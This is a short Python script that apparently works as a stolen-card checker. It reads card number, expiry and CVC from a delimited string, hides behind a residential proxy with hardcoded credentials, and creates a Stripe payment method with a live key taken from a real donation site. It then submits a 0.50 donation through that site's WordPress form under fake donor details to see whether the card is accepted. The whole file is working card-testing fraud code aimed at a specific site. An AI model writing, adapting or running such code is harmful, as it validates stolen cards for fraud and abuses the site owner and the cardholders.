import requests,re
from proxy import reqproxy, make_request
def Tele(ccx):
	proxy_str = "brd.superproxy.io:33335:brd-customer-hl_37c42edc-zone-yg69:0265kxd56ii6"
	session, ip = reqproxy(proxy_str)
	#print(f"IP Address: {ip}")
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()

	headers = {
	'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9',
    #'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
	}

	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F4901af2b6b%3B+stripe-js-v3%2F4901af2b6b%3B+card-element&referrer=https%3A%2F%2Fwww.aaronabke.com&time_on_page=125965&key=pk_live_51GGaWMAJSPmZlL2afbQZDpv2vTIB3894XGGxamKUqTCkHjOi5xT0xBMn8GYDCIiWqs2T6mFpst5ZwqnwlJzghdDC00HIeZ9lw8'
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)

	pm = r1.json()['id']

	cookies = {
	'cookie_notice_accepted': 'true',
    '__stripe_mid': 'cb5695ff-1616-4211-9160-a9e81e4a1c4b350bba',
    '__stripe_sid': '41dfc9d3-045f-4734-8d8c-413993407ae2384840',
	}

	headers = {
	'authority': 'www.aaronabke.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    #'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://www.aaronabke.com',
    'referer': 'https://www.aaronabke.com/donate/',
    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
    't': '1744452945936',
}

	data = {
    'data': 'item_4__fluent_sf=&__fluent_form_embded_post_id=884&_fluentform_4_fluentformnonce=7a04a2239d&_wp_http_referer=%2Fdonate%2F&names%5Bfirst_name%5D=Rodam&names%5Blast_name%5D=User&email=rodamuser08%40gmail.com&custom-payment-amount=&payment_input=0&payment_input_custom_0=0.50&payment_input_custom_1=&input_text=&payment_method=stripe&__stripe_payment_method_id='+str(pm)+'',
    'action': 'fluentform_submit',
    'form_id': '4',
}
	
	r2 = session.post(
			'https://www.aaronabke.com/wp-admin/admin-ajax.php',
			params=params,
			cookies=cookies,
			headers=headers,
			data=data,
	)
	result2 = r2.text
	return result2
	

